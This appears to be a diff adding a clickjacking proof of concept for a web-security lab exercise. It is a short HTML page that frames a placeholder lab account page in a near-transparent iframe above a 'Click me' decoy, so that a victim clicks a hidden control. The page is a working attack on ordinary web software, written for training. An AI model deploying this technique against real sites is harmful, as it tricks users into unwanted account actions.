@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<!-- DSTRIKE Lab PoC: clickjacking-lab-01.html (Basic clickjacking with CSRF token protection) -->
+<html>
+<head>
+  <style>
+    iframe { position: relative; width: 700px; height: 600px; opacity: 0.0001; z-index: 2; }
+    div.decoy { position: absolute; top: 495px; left: 60px; z-index: 1; font-family: sans-serif; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="decoy">Click me</div>
+  <iframe src="https://TARGET-LAB-ID.web-security-academy.net/my-account"></iframe>
+</body>
+</html>
